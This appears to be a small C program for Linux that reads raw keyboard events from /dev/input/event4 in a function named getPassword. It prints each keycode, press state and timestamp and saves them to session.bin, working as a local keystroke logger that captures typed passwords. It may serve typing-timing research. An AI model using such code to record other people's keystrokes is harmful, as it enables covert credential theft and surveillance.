#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <math.h>
#include <stdint.h>
#include <linux/input.h>
#include <string.h>
#include <fcntl.h>

#define BITS_PER_LONG (sizeof(long) * 8)
#define NBITS(x) ((((x)-1)/BITS_PER_LONG)+1)
#define OFF(x)  ((x)%BITS_PER_LONG)
#define BIT(x)  (1UL<<OFF(x))
#define LONG(x) ((x)/BITS_PER_LONG)
#define test_bit(bit, array)	((array[LONG(bit)] >> OFF(bit)) & 1)
#ifndef EV_SYN
#define EV_SYN 0
#endif

//Structure to hold data related to a single key event
struct{
   double time;
   int keycode;
   int isUp;
}typedef keypress;

void getPassword(char* eventPath) {
  keypress* keyStruct = malloc(sizeof(keypress));
  struct input_event eventCap[64];
  int fileDesc, readEvent;
  int addVal = 0;
  int breakVal = 0;

  //temp: test this
  if ((fileDesc = open(eventPath, O_RDONLY)) < 0) {
		perror("Could not open file");
		return;
  }
  FILE* fp;
  fp = fopen("session.bin", "wb");
  while(1) {
    readEvent = read(fileDesc, eventCap, sizeof(struct input_event) * 64);
    
    for(int i = 0; i < readEvent/sizeof(struct input_event); i++) {
      if(eventCap[i].type == EV_SYN) {
        //do nothing
      } else if(eventCap[i].type == EV_MSC && (eventCap[i].code == MSC_RAW 
               || eventCap[i].code == MSC_SCAN)) {
        //do nothing
      }
      else {
        //temp: change size to fit better
        char timeString [20];
        sprintf(timeString, "%ld.%06ld", eventCap[i].time.tv_sec, eventCap[i].time.tv_usec);
        char *ptr = NULL;
        double timeDouble = strtod(timeString, &ptr);
        int keycode = eventCap[i].code;
        int state = eventCap[i].value;

        keyStruct->time = timeDouble;
        keyStruct->keycode = keycode;
        keyStruct->isUp = state;
        printf("%f, %d, %d\n", timeDouble, keycode, state);
        fwrite(keyStruct, sizeof(keypress), 1, fp);
        
      }
    }
  }
  fclose(fp);
  close(fileDesc);
}

int main(){
  getPassword("/dev/input/event4");

}
